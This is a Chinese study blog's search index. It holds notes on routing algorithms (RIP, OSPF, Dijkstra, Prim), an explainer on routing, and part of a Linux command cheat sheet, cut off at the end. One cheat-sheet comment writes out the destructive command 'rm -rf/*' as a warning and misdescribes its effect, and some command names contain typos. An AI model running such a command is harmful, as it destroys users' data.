<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows DOS命令\批处理脚本学习</title>
      <link href="/2022-09-02-Coder/Windows-DOS%E5%91%BD%E4%BB%A4-%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022-09-02-Coder/Windows-DOS%E5%91%BD%E4%BB%A4-%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Coder </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>路由算法</title>
      <link href="/2022-09-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E7%AE%97%E6%B3%95/"/>
      <url>/2022-09-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="路由算法综述"><a href="#路由算法综述" class="headerlink" title="路由算法综述"></a><strong>路由算法综述</strong></h1><p>路由器转发分组是通过路由表转发的，而路由表是通过各种算法得到的。主机通常直接与一台路由器相连接，该路由器即为该主机的默认路由器(default router) ，又称该主机的第一跳路由器(first-hop router)每当主机发送一个分组时，该分组被传送给它的默认路由器。源主机的默认路由器称作源路由器(source router) ,目的主机的默认路由器称作目的路由器(destination router)。 一个分组从源主机到目的主机的路由选择问题显然可归结为从源路由器到目的路由器的路由选择问题。</p><blockquote><p>【路由选择算法的分类】</p><ul><li>1)静态路由算法（又称非自适应路由算法）</li><li>2)动态路由算法（又称自适应路由算法）</li></ul><blockquote><p> 从掌握网络拓扑信息的规模来看常用的动态路由算法可分为两类：</p><ul><li>距离－向量路由算法（分散路由选择算法）</li><li>链路状态路由算法（全局路由选择算法）</li></ul></blockquote></blockquote><h1 id="静态路由算法"><a href="#静态路由算法" class="headerlink" title="静态路由算法"></a><strong>静态路由算法</strong></h1><ul><li>由<strong>网络管理员手工配置路由信息</strong>。当网络的拓扑结构或链路的状态发生变化时，网络管理员需要手工去修改路由表中相关的静态路由信息。大型和复杂的网络环境通常不宜采用静态路由。</li></ul><blockquote><p>理由：</p><ul><li>网络管理员难以全面了解整个网络的拓扑结构</li><li>当网络的拓扑结构和链路状态发生变化时，路由器中的静态路由信息需要大范围地调整，这一工作的难度和复杂程度非常高</li><li>路由信息更新慢</li></ul></blockquote><ul><li>静态路由算法的优点是简便、可靠，在负荷稳定、拓扑变化不大的网络中运行效果很好，因此仍广泛用于高度安全的军事系统和较小的商业网络。且优先级高</li></ul><h1 id="动态路由算法"><a href="#动态路由算法" class="headerlink" title="动态路由算法"></a>动态路由算法</h1><p>动态路由算法能改善网络的性能并有助于流量控制；但算法复杂，会增加网络的负担，有时因对动态变化的反应太快而引起振荡，或反应太慢而影响网络路由的一致性，因此要仔细设计动态路由算法，以发挥其优势。</p><blockquote><p>特点：</p><ul><li>路由更新快</li><li>定期更新（周期性）</li></ul></blockquote><h2 id="距离-向量路由算法-RIP-分散路由选择算法"><a href="#距离-向量路由算法-RIP-分散路由选择算法" class="headerlink" title="距离-向量路由算法(RIP)-分散路由选择算法"></a><strong>距离-向量路由算法(RIP)</strong>-分散路由选择算法</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><blockquote><p>路由信息协议RIP（Routing Information Protocol）采用距离-向量算法，利用跳数来作为计量标准，在实际使用中已经较少适用。距离向量路由算法，是基于Bellman-Ford方程，也就是动态规划算法实现的。</p><p>在距离向量路由算法中，同样是计算由u到其他任意一点。但在这种算法中，u无需知道整个网络的拓扑结构。<strong>对u来说，最重要的事情是知道，如果需要把数据运往z，最合适的邻居节点究竟是哪一个</strong>。</p><p><strong>即节点只需获取最短路径的下一跳，无需知道整个网络拓扑的情况，并且该信息用于转发表中</strong>。</p></blockquote><h3 id="宏观："><a href="#宏观：" class="headerlink" title="宏观："></a>宏观：</h3><blockquote><p>在默认情况下，RIP使用一种非常简单的度量制度：距离就是通往目的站点所需经过的链路数，取值为0~16，数值16表示路径无限长。RIP进程使用UDP的520端口来发送和接收RIP分组。RIP分组每隔30s以广播的形式发送一次，为了防止出现“广播风暴”，其后续的分组将做随机延时后发送。在RIP中，如果一个路由在180s内未被刷新，则相应的距离就被设定成无穷大，并从路由表中删除该表项。RIP分组分为两种：请求分组和响应分组。</p></blockquote><h3 id="发送方-请求分组-："><a href="#发送方-请求分组-：" class="headerlink" title="发送方(请求分组)："></a>发送方(请求分组)：</h3><blockquote><p>在距离-向量路由算法中，所有结点都定期地将它们的整个路由选择表传送给所有与之直接相邻的结点。这种路由选择表包含：</p><ol><li>每条路径的目的地（另一结点）。</li><li>路径的代价（也称距离）。</li></ol><p>【注意】：</p><p>这里的距离是一个抽象的概念，如RIP 就将距离定义为“跳数＂。跳数指从源端口到达目的端口所经过的路由个数，每经过一个路由器，跳数加1 。</p></blockquote><h3 id="接收方-响应分组-："><a href="#接收方-响应分组-：" class="headerlink" title="接收方(响应分组)："></a>接收方(响应分组)：</h3><p>在这种算法中，所有结点都必须参与距离向量交换，以保证路由的有效性和一致性，也就是说，所有的结点都监听从其他结点传来的路由选择更新信息，并在下列情况下立刻更新它们的路由选择表：</p><ol><li>被通告一条新的路由，该路由在本结点的路由表中不存在，此时本地系统加入这条新的路由。</li><li>发来的路由信息中有一条到达某个目的地的路由，该路由与当前使用的路由相比，有较短的距离（较小的代价）。此种情况下，就用经过发送路由信息的结点的新路由替换路由表中到达那个目的地的现有路由。</li></ol><blockquote><p>总结起来如下图：（DV即为距离向量）</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011631793.png" alt="img" style="zoom:33%;" /></blockquote><h3 id="距离向量路由算法的实质"><a href="#距离向量路由算法的实质" class="headerlink" title="距离向量路由算法的实质"></a>距离向量路由算法的实质</h3><blockquote><p>迭代计算一条路由中的站段数或延迟时间，从而得到到达一个 目标的最短（最小代价）通路。它要求每个结点在每次更新时都将它的全部路由表发送给所有相邻的结点。显然，更新报文的大小与通信子网的结点个数成正比，大的通信子网将导致很大的更新报文。由于更新报文发给直接邻接的结点，所以所有结点都将参加路由选择信息交换。基于这些原因，在通信子网上传送的路由选择信息的数量很容易变得非常大。</p><p>距离向量路由算法是一种<strong>迭代的、异步的、分布式</strong>的算法。</p><ul><li><p>迭代很好理解，在每个节点只需要知道他的下一跳的目的地的情况下，想要求得最小路径，那么必然需要使用迭代，使得最短路径不断趋近于真实值。为什么说是不断趋近于真实值呢？一开始，也就是初始化时，结点只知道他到其邻居结点的距离，而不知道到其他结点的距离。这就必然造成此结点到其直接邻居结点的距离并非是最优的，可能是绕过一个或两个结点再到此结点的情况，才是最短的路径。</p></li><li><p>所谓异步的，是因为我们不要求结点的步调整齐一致，也就是计算最短路径的时间可以是不同的。实际上，时间基本上就是不同。</p></li><li><p>所谓分布式的，是说每个节点都能接收到来自其邻居的信息，并执行计算，然后再将计算结果分发给邻居，邻居再将收到的数据进行计算，如果发现了其他最短路径，那么就会更新自身的信息，又进入了一个迭代的过程。</p><p>整个算法中最重要的是这样一个方程：</p></li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011627203.png" alt="img" style="zoom:50%;" /></blockquote><h2 id="链路状态路由算法-OSPF-全局路由选择算法"><a href="#链路状态路由算法-OSPF-全局路由选择算法" class="headerlink" title="链路状态路由算法(OSPF)-全局路由选择算法"></a><strong>链路状态路由算法(OSPF)</strong>-全局路由选择算法</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在链路状态路由算法中，网络拓扑和所有的链路费用都是已知的。所有的结点或者说路由器都掌握着完整的网络拓扑和链路费用。</p><p>不论是链路状态路由算法还是距离向量选择算法，核心要义都是四个字：”<strong>最短路径</strong>“。并且知晓网络全貌，了解整个网络拓扑，那自然是会用到Prim和Dijkstra算法。</p><h3 id="它们执行下述两项任务"><a href="#它们执行下述两项任务" class="headerlink" title="它们执行下述两项任务:"></a>它们执行下述两项任务:</h3><ol><li>第一，主动测试所有邻接结点的状态。两个共享一条链接的结点是相邻结点，它们连接到同一条链路，或者连接到同一广播型物理网络。</li><li>第二，定期地将链路状态传播给所有其他结点。<code>典型的链路状态算法是OSPF算法。</code></li></ol><p>在一个链路状态路由选择中，一个结点检查所有直接链路的状态，并将所得的状态信息发送给网上的所有其他结点，而不是仅送给那些直接相连的结点。每个结点都用这种方式从网上所有其他的结点接收包含直接链路状态的路由选择信息。</p><p>每当链路状态报文到达时，路由结点便使用这些状态信息去更新自己的网络拓扑和状态“视野图”，一旦链路状态发生变化，结点就对更新的网络图利用Dijsktra最短路径算法重新计算路由，从单一的源出发计算到达**&#x3D;&#x3D;所有&#x3D;&#x3D;**目的结点的最短路径。</p><blockquote><p>【注意】</p><p>这是Dijsktra算法的一个实际应用</p></blockquote><h3 id="链路状态路由算法主要有三个特征："><a href="#链路状态路由算法主要有三个特征：" class="headerlink" title="链路状态路由算法主要有三个特征："></a>链路状态路由算法主要有三个特征：</h3><ol><li>向本自治系统中所有路由器发送信息，这里使用的方法是泛洪法，即路由器通过所有端口向所有相邻的路由器发送信息。而每个相邻路由器又将此信息发往其所有相邻路由器（但不再发送给刚刚发来信息的那个路由器）。</li></ol><blockquote><p>【洪泛法小知识】</p><p>洪泛法（Flooding）是一种简单的路由算法，将收到的封包，往所有的可能连结路径上递送，直到封包到达为止。洪泛法被使用在桥接器上，Usenet以及点对点档案分享等。部份的路由协定也以洪泛法为基础，例如开放式最短路径优先（OSPF）、距离向量群体广播路由协定(DistanceVectorMulticastRoutingProtocol，DVMRP)。无线随意网络也使用洪泛法来进行路由。</p></blockquote><ol start="2"><li><p>发送的信息是与路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。所谓“链路状态”，是指说明本路由器与哪些路由器相邻及该链路的“度量”。对于OSPF 算法，链路状态的＂度量”主要用来表示费用、距离、时延、带宽等。</p></li><li><p>只有当链路状态发生变化时，路由器才向所有路由器发送此消息。由于一个路由器的链路状态只涉及相邻路由器的连通状态，而与整个互联网的规模并无直接关系，因此链路状态路由算法可以用于大型的或路由信息变化聚敛的互联网环境。</p></li></ol><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>每个路由结点都使用同样的原始状态数据独立地计算路径，而不依赖中间结点的计算；</li><li>链路状态报文不加改变地传播，因此采用该算法易于查找故障。当一个结点从所有其他结点接收到报文时，它可以在本地立即计算正确的通路，保证一步汇聚。</li><li>由于链路状态报文仅运载来自单个结点关于直接链路的信息，其大小与网络中的路径结点数目无关，因此链路状态算法比距离-向量算法有更好的规模可伸展性。</li></ul><h2 id="距离-向量路由算法与链路状态路由算法的比较："><a href="#距离-向量路由算法与链路状态路由算法的比较：" class="headerlink" title="距离-向量路由算法与链路状态路由算法的比较："></a>距离-向量路由算法与链路状态路由算法的比较：</h2><blockquote><p>在距离-向量路由算法中，每个结点仅与它 的直接邻居交谈，它为它的邻居提供从自已到网络中所有其他结点的最低费用估计。在链路状态 路由算法中，每个结点通过广播的方式与所有其他结点交谈，但它仅告诉它们与它直接相连的链 路的费用。相较之下，距离-向量路由算法有可能遇到路由环路等问题。</p><ul><li>【路由环路问题】：</li></ul><p>在维护路由表信息的时候，如果在拓扑发生改变后，网络收敛缓慢产生了不协调或者矛盾的路由选择条目，就会发生路由环路的问题，这种条件下，路由器对无法到达的网络路由不予理睬，导致用户的数据包不停在网络上循环发送，最终造成网络资源的严重浪费。</p><p> OSPF(Open Shortest Path First开放式最短路径优先）是对链路状态路由协议的一种实现，著名的迪克斯加算法被用来计算最短路径树。OSPF支持负载均衡和基于服务类型的选路，也支持多种路由形式，如特定主机路由和子网路由等。OSPF的简单说就是两个相邻的路由器通过发报文的形式成为邻居关系，邻居再相互发送链路状态信息形成邻接关系，之后各自根据最短路径算法算出路由，放在OSPF路由表，OSPF路由与其他路由比较后优的加入全局路由表。</p></blockquote><h1 id="层次路由"><a href="#层次路由" class="headerlink" title="层次路由"></a><strong>层次路由</strong></h1><p>当网络规模扩大时，路由器的路由表成比例地增大。这不仅会消耗越来越多的路由器缓冲区空间，而且需要用更多CPU 时间来扫描路由表，用更多的带宽来交换路由状态信息。因此路由选择必须按照层次的方式进行。</p><p>因特网将整个互联网划分为许多较小的自治系统（注意一个自治系统中包含很多局域网），每个自治系统有权自主地决定本系统内应采用何种路由选择协议。如果两个自治系统需要通信，那么就需要一种在两个自治系统之间的协议来屏蔽这些差异。据此，因特网把路由选择协议划分为两大类</p><ol><li>一个自治系统内部所使用的路由选择协议称为内部网关协议(IGP), 也称域内路由选择，具体的协议有RIP 和OSPF 等。</li><li>自治系统之间所使用的路由选择协议称为外部网关协议(EGP), 也称域间路由选择，用在不同自治系统的路由器之间交换路由信息，并负责为分组在不同自治系统之间选择最优的路径。具体的协议有BGP 。</li></ol><h1 id="迪杰斯特拉算法（Dijkstra算法）"><a href="#迪杰斯特拉算法（Dijkstra算法）" class="headerlink" title="迪杰斯特拉算法（Dijkstra算法）"></a>迪杰斯特拉算法（Dijkstra算法）</h1><p>从一个例子开始</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011616799.png" alt="img" style="zoom:50%;" /><p>在上图中，我们以u为起点，计算u到z的最短路径。可见，若要计算u到z的路径，那么必须考虑全局信息。</p><p>实际上，迪杰斯特拉算法的核心内容是：找最小，然后找最小的邻居。</p><p>具体过程参考下图。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011617232.png" alt="img" style="zoom: 25%;" /><ol><li>初始化 ：与u相邻的置为权值，不与u相邻的置为无穷。 </li><li>找到最小 ：在上图中，与u相邻的权值最小的是（w，3），所以将w加入集合中。 </li><li>在其余中找最小 ：5为最小，则将x加入集合。经过x，可以到达z，这样最短，将z更新为14。 </li><li>接着找最小 ：6为最小，将v加入集合。经过uwv，可以到达y，最小值为10，则更新。 </li><li>依次类推，得到最终结果</li></ol><p>所以，我们能够得到最终的转发表。</p><table><thead><tr><th align="left">目的</th><th align="left">链路</th></tr></thead><tbody><tr><td align="left">v</td><td align="left">u-w-v</td></tr><tr><td align="left">x</td><td align="left">u-x</td></tr><tr><td align="left">y</td><td align="left">u-w-v-y</td></tr><tr><td align="left">w</td><td align="left">u-w</td></tr><tr><td align="left">z</td><td align="left">u-w-v-y-z</td></tr></tbody></table><h1 id="Prim算法——最小生成树"><a href="#Prim算法——最小生成树" class="headerlink" title="Prim算法——最小生成树"></a>Prim算法——最小生成树</h1><p>prim算法被用来求给定图的最小生成树</p><p>普里姆算法的实现思路是：</p><ol><li>将连通网中的所有顶点分为两类（假设为 A 类和 B 类）。初始状态下，所有顶点位于 B 类；</li><li>选择任意一个顶点，将其从 B 类移动到 A 类；</li><li>从 B 类的所有顶点出发，找出一条连接着 A 类中的某个顶点且权值最小的边，将此边连接着的 A 类中的顶点移动到 B 类；</li><li>重复执行第 3 步，直至 B 类中的所有顶点全部移动到 A 类，恰好可以找到 N-1 条边。</li></ol><p>举个例子，下图是一个连通网，使用普里姆算法查找最小生成树，需经历以下几个过程：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702115.gif" alt="img"><br>图 1 连通网<br>\1) 将图中的所有顶点分为 A 类和 B 类，初始状态下，A &#x3D; {}，B &#x3D; {A, B, C, D, S, T}。</p><p>\2) 从 B 类中任选一个顶点，假设选择 S 顶点，将其从 B 类移到 A 类，A &#x3D; {S}，B &#x3D; {A, B, C, D, T}。从 A 类的 S 顶点出发，到达 B 类中顶点的边有 2 个，分别是 S-A 和 S-C，其中 S-A 边的权值最小，所以选择 S-A 边组成最小生成树，将 A 顶点从 B 类移到 A 类，A &#x3D; {S, A}，B &#x3D; {B, C, D, T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702093.gif" alt="img"><br>图 2 S-A 边组成最小生成树<br>\3) 从 A 类中的 S、A 顶点出发，到达 B 类中顶点的边有 3 个，分别是 S-C、A-C、A-B，其中 A-C 的权值最小，所以选择 A-C 组成最小生成树，将顶点 C 从 B 类移到 A 类，A &#x3D; {S, A, C}，B &#x3D; {B, D, T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702109.gif" alt="img"><br>图 3 A-C 边组成最小生成树<br>\4) 从 A 类中的 S、A、C 顶点出发，到达 B 类顶点的边有 S-C、A-B、C-B、C-D，其中 C-D 边的权值最小，所以选择 C-D 组成最小生成树，将顶点 D 从 B 类移到 A 类，A &#x3D; {S, A, C, D}，B &#x3D; {B, T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702112.gif" alt="img"><br>图 4 C-D 边组成最小生成树<br>\5) 从 A 类中的 S、A、C、D 顶点出发，到达 B 类顶点的边有 A-B、C-B、D-B、D-T，其中 D-B 和 D-T 的权值最小，任选其中的一个，例如选择 D-B 组成最小生成树，将顶点 B 从 B 类移到 A 类，A &#x3D; {S, A, C, D, B}，B &#x3D; {T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702103.gif" alt="img"><br>图 5 D-B 边组成最小生成树<br>\6) 从 A 类中的 S、A、C、D、B 顶点出发，到达 B 类顶点的边有 B-T、D-T，其中 D-T 的权值最小，选择 D-T 组成最小生成树，将顶点 T 从 B 类移到 A 类，A &#x3D; {S, A, C, D, B, T}，B &#x3D; {}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702137.gif" alt="img"><br>图 6 D-T 边组成最小生成树<br>\7) 由于 B 类中的顶点全部移到了 A 类，因此 S-A、A-C、C-D、D-B、D-T 组成的是一个生成树，而且是一个最小生成树，它的总权值为 17。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011703900.gif" alt="img"><br>图 7 最小生成树</p><blockquote><p><a href="http://c.biancheng.net/algorithm/prim.html">prim算法（普里姆算法）详解</a></p></blockquote><h1 id="Prim与Dijkstra算法的区别"><a href="#Prim与Dijkstra算法的区别" class="headerlink" title="Prim与Dijkstra算法的区别"></a>Prim与Dijkstra算法的区别</h1><p>两者的区别在于，每次更新路径的不一样</p><ul><li>prim更新的是未标记集合到已标记集合之间的距离</li><li>Dijkstra更新的是源点到未标记集合之间的距离</li></ul><p>Prim算法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">#更新lowcost</span></span><br><span class="line">    <span class="keyword">if</span>(lowcost[k] &gt; graph[v][k]):</span><br><span class="line">        lowcost[k] = graph[v][k]</span><br><span class="line">        mst[k] = v <span class="comment">#如果有被更新的权值，就把当前点作为被更新权值的那条边的起始点</span></span><br></pre></td></tr></table></figure><p>Dijkstra算法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">if</span>(graph[v][k] &lt; MAX <span class="keyword">and</span> sign[k] <span class="keyword">and</span> graph[v][k] + <span class="built_in">dict</span>[v] &lt; <span class="built_in">dict</span>[k]):</span><br><span class="line">        <span class="built_in">dict</span>[k] = graph[v][k]+<span class="built_in">dict</span>[v]</span><br><span class="line">        parent[k] = v</span><br></pre></td></tr></table></figure><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/87748517">https://zhuanlan.zhihu.com/p/87748517</a></li><li><a href="https://zhuanlan.zhihu.com/p/138122809">https://zhuanlan.zhihu.com/p/138122809</a></li><li><a href="https://cloud.tencent.com/developer/article/1595863">一文详解路由算法</a></li><li><a href="http://c.biancheng.net/algorithm/prim.html">prim算法（普里姆算法）详解</a></li><li><a href="https://www.bilibili.com/video/BV1Ea411V7gu?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=e73a152dada4626bad49c30d848902f7">路由器是如何路由的？（上集）</a></li></ul></blockquote><iframe src="//player.bilibili.com/player.html?aid=217578518&bvid=BV1Ea411V7gu&cid=819326392&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" width="100%" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts" height="100%" allowfullscreen="allowfullscreen"> </iframe>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 网络层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由算法 </tag>
            
            <tag> Prim与Dijkstra算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由是什么</title>
      <link href="/2022-09-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E6%98%AF%E4%BB%80%E4%B9%88/"/>
      <url>/2022-09-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E6%98%AF%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p><strong>路由是什么</strong></p><p>如下网络拓扑图，交换机0所在的网段为192.168.1.0&#x2F;24，交换机1所在网段为192.168.2.0&#x2F;24，且各自有2台主机：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539588.png" alt="image-20220901153925382"></p><p>假设192.168.1.10&#x2F;32的PC0要跟192.168.2.11&#x2F;32的PC4通信，如何实现？</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539602.png" alt="image-20220901153939464"></p><p>中间就需要一个路由器的东西。我们知道，PC0发出的数据包的目的地址是跨网段的，也就是需要<strong>出网关</strong>。网关是数据包出所在网段的出口。网关地址一般是所在网段的前一两个地址，且网关一般都集成在路由器中，称为<strong>下一跳</strong>。</p><p>子网中的每一台主机都需要配置好默认网关，即下一跳：PC0的默认网关为192.168.1.1&#x2F;32、PC4的默认网关为192.168.2.1&#x2F;32。这样子PC0要发给PC4的数据包会先抵达路由器的192.168.1.1&#x2F;32地址的网卡，路由器拿到该数据包后，将其从192.168.2.1&#x2F;32的网卡发送出去。也就是说，路由器在中间负责<strong>中转</strong>数据包。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539379.png" alt="image-20220901153950236"></p><p>在如上拓扑图中，PC0还是要发数据包给PC4，当数据包抵达路由器1时，路由器1并不知道通往PC4的路径，于是需要在路由器1上的路由表上添加路由规则，使其知道应该将数据包发往192.168.2.0&#x2F;24网段的地址，需要走往哪一个路由器，这里是路由器2。其他路由器同理，直至到目的主机PC4。</p><p>网络畅通的条件是有去有回，所以当数据包从PC4返回PC0时，沿途的所有路由器都需要数据包的转法路径，也就是配置好返回的路由，使其知道数据包发往192.168.1.0&#x2F;24网段的地址需要走往哪一个路由器。</p><p>人为添加的路由称之为<strong>静态路由</strong>，但当路由器连接的网段太多时不方便配置静态路由，可以让路由器自行学习得到数据包的下一个中转地址，称之为<strong>动态路由</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 网络层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令及技巧</title>
      <link href="/2022-08-26-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&amp;Linux/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%8A%80%E5%B7%A7/"/>
      <url>/2022-08-26-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&amp;Linux/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Is        <span class="comment">#显示文件或目录</span></span><br><span class="line">    -l         <span class="comment">#列出文件详细信息Iist</span></span><br><span class="line">    -a(all)    <span class="comment">#列出当前目录下所有文件及目录，包括隐藏的</span></span><br><span class="line">ll        <span class="comment">#与ls不同，是列出所有文件的具体属性！</span></span><br><span class="line"><span class="built_in">ls</span> -al    <span class="comment">#是列出完整的全部，包括配置文件</span></span><br><span class="line"><span class="built_in">mkdir</span> -p  <span class="comment">#创建目录，若无父目录，则创建p(parent)</span></span><br><span class="line"><span class="built_in">cd</span> ~      <span class="comment">#回到用户根目录</span></span><br><span class="line"><span class="built_in">touch</span>     <span class="comment">#创建空文件</span></span><br><span class="line"><span class="built_in">echo</span>      <span class="comment">#创建带有内容的文件。echo创建文件时一个&gt;表示覆盖文件，两个&gt;&gt;表示在文件尾追加</span></span><br><span class="line"><span class="built_in">cat</span>       <span class="comment">#查看文件内容，cat是concatenate的简写，类似于dos下面的type命令</span></span><br><span class="line"><span class="built_in">cp</span>        <span class="comment">#拷贝</span></span><br><span class="line"><span class="built_in">mv</span>        <span class="comment">#移动或重命名</span></span><br><span class="line">more、less    <span class="comment">#分页显示文本文件内容，q键退出</span></span><br><span class="line"><span class="built_in">pwd</span>        <span class="comment">#查看目录</span></span><br><span class="line">whereis   <span class="comment">#用于查找文件。该指令会在特定目录中查找符合条件的文件。该指令只能用于查找二进制文件、源代码文件和man手册页，一般文件的定位需使用locate命令。</span></span><br><span class="line"><span class="built_in">where</span> <span class="built_in">ls</span>        <span class="comment">#可以显示出ls命令所在目录</span></span><br><span class="line"><span class="built_in">rm</span>         <span class="comment">#删除</span></span><br><span class="line">    -r   <span class="comment">#递归删除，可删除子目录及文件</span></span><br><span class="line">    -f   <span class="comment">#强制删除</span></span><br><span class="line">    <span class="comment">#注意：rm  -rf/*删除C盘所有文件，连C盘都没了，很严重，切勿使用</span></span><br><span class="line">find +文件名+目录     <span class="comment">#在文件系统中搜索某文件</span></span><br><span class="line">WC        <span class="comment">#统计文本中行数、字数、字符数</span></span><br><span class="line">grep    <span class="comment">#在文本文件中查找某个字符串，find和grep可以组合使用，通过|符号，在这个符号左右的命令互不干扰，一起执行</span></span><br><span class="line">        <span class="comment">#如find / |grep passwad即从根目录开始查找所有包含passwd字段的地方</span></span><br><span class="line"><span class="built_in">rmdir</span>     <span class="comment">#删除空目录</span></span><br><span class="line">tree      <span class="comment">#树形结构显示目录，需要安装tree包</span></span><br><span class="line">In+文件名+目录        <span class="comment">#创建链接文件</span></span><br><span class="line"><span class="built_in">head</span>、<span class="built_in">tail</span>    <span class="comment">#显示文件头、尾内容</span></span><br><span class="line">ps        <span class="comment">#查看进程</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile        <span class="comment">#验证安装,使配置生效</span></span><br><span class="line"><span class="built_in">uname</span> -a    <span class="comment">#查看CPU 架构</span></span><br><span class="line">lsb_release -d    <span class="comment">#命令可以查看Linux 系统的发行版本</span></span><br><span class="line">lsb_release -cs</span><br></pre></td></tr></table></figure><p>- </p><h2 id="apt命令"><a href="#apt命令" class="headerlink" title="apt命令"></a>apt命令</h2><h3 id="操作系统更新和清理"><a href="#操作系统更新和清理" class="headerlink" title="操作系统更新和清理:"></a>操作系统更新和清理:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update    <span class="comment">#更新</span></span><br><span class="line">apt autoclean<span class="comment">#清理缓存</span></span><br><span class="line">apt cleansudo<span class="comment">#清理无用的软件包</span></span><br><span class="line">apt autoremove<span class="comment">#卸载过期的软件包    </span></span><br></pre></td></tr></table></figure><h3 id="apt-get-f-install-命令"><a href="#apt-get-f-install-命令" class="headerlink" title="apt-get -f install 命令"></a><code>apt-get -f install</code> 命令</h3><p>Ubuntu 下当发现可能是安装的其他软件包不兼容导致了安装包出错时，可以根据提示需要执行“sudo apt-get  -f install ”来卸载之前的冲突包。如果安装过aptitude包，还可以使用命令“ aptitude -f install ”，实现相同的效果。</p><ul><li>说明：</li></ul><blockquote><p>1、sudo apt-get -f install 是修复损坏的软件包，尝试卸载出错的包，重新安装正确版本的。是apt-get -f install&#x3D;apt-get install -f ,是修复依赖关系(depends)的命令,就是假如你的系统上有某个package不满足依赖条件,这个命令就会自动修复,安装那个package依赖的package。</p><p>2、-f 是 参数</p><p>放在 install 前面跟后面是一样的效果</p><p>即： <code>&quot; sudo apt-get -f install &quot; equals to &quot; sudo apt-get install -f&quot;</code></p></blockquote><ul><li>参考：</li></ul><blockquote><ul><li><a href="https://askubuntu.com/questions/381145/what-was-the-difference-between-sudo-apt-get-f-install-and-sudo-apt-get-inst">What was the difference between sudo apt-get -f install and sudo apt-get install -f?</a></li><li><a href="http://www.iasptk.com/ubuntu-fix-broken-package-best-solution/">Ubuntu fix broken package (best solution)</a></li></ul></blockquote><h3 id="关于apt过程中的一个问题："><a href="#关于apt过程中的一个问题：" class="headerlink" 